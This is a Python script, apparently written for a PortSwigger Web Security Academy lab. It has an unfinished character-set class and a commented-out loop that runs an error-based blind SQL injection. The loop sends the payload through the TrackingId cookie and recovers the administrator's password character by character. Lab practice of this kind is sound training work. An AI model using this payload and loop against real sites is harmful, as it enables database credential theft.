import requests


class needle:

    def __init__(self, host, url, char_set='basic'):

        alpha = 'abcdefghijklmnopqrstuvwxyz'
        alpha = alpha + alpha.upper()
        alpha = alpha + '1234567890'

    def generate_char_set(self, type):

        if type == 'basic':
            alphabet = 'abcdefghijklmnopqrstuvwxyz'
            numbers = '0123456789'
            charset = alphabet + alphabet.upper() + numbers
        else:
            print()

        return charset


def main():
    host = '0a01000904f6df9181f5ac8f00cc00ba.web-security-academy.net'
    url = 'https://0a01000904f6df9181f5ac8f00cc00ba.web-security-academy.net/'
    injector = needle(host, url)
    injector.generate_char_set('basic')


if __name__ == "__main__":
    main()

# password = ''
# matching = True
#
# while matching:
#    lens = []
#    matching = False
#    for a in alpha:
#
#        cookies = {
#            "TrackingId": f"kLC4Aq2kTsXelXdt' and (select case when (substring((select password from users where username='administrator'), 1,{str(len(password) + 1)}) = '{password + a}') then 1/0 else 'a' end) = 'a' --",
#            "session": "c2XiCxNa8buOeWuquxC0DiVBppt1nBkC"
#        }
#        headers = {"Host": host}
#        # print(cookies)
#        r = requests.get(url, cookies=cookies, headers=headers)
#        print(r.text)
#        print(len(r.content))
#        if len(r.content) == 11466:
#            password += a
#            matching = True
#            break
#
#
#    print(password)